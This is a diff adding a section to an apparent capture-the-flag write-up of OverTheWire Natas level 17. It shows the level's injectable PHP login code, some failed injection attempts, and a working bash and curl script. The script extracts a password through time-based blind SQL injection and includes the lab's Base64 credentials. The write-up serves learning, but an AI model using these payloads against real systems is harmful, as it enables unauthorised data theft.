@@ -501,3 +501,79 @@ do
         done
 done
 ```
+
+
+SQL Timing attack
+
+As before but there's no print out, check out this scenario
+
+```php
+<?
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas17', '<censored>');
+    mysql_select_db('natas17', $link);
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
+```
+
+This appeared absolutely impossible because there's no return. Yet again I tried injecting php code. The only way I thought I could get feedback is by checking on some return from the debug. If I set in the form `action=?debug`, I figured that could be my trigger, for example:
+
+`natas17"; $_GET['debug']=1 #`
+
+`natas18"; <script type="text/javascript"> var = '<?php $_GET["debug"]=1; ?>;' </script> #; $a="`
+
+But it was being sanitized out. My only idea.
+
+Also yet again, I had to check for hints. I saw a timing attack was the key. A timing attack is implied information, not through printouts but through duration. Simply executing a query `SELECT * FROM users WHERE username="I_exist" AND sleep(5)`. This isn't intuitive it's not like a normal logical statement like True and True (I don't think). In this context it's more like the sleep command will get executed "for every record the query finds" ([source](https://www.saotn.org/mysql-sleep-attacks/)). So the solution strategy is going to be a brute force with curl using `like binary` matching as before except we check the total execution time instead of the presence of a particular return string
+
+```bash
+front=''
+for i in {1..65}
+do
+        for c in {A..Z} {a..z} {0..9}
+        do
+                change=0
+                /usr/bin/time -f'%e' -o time.log\
+                curl -s 'http://natas17.natas.labs.overthewire.org/' \
+                -H 'Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==' \
+                --data-raw 'username=natas18%22+and+password+like+binary+%22'$front$c'%25%22+and+sleep%285%29+%23' >/dev/null
+
+                dur=$(cat time.log)
+                if [[ $dur > 2 ]]
+                then 
+                        change=1
+                        front=$front$c
+                        echo -e "found char $c \t-- $front"
+                        break
+                fi
+        done
+        if [ $change == 0 ]; then echo "final: $front"; break ;fi
+done
+rm time.log
+```
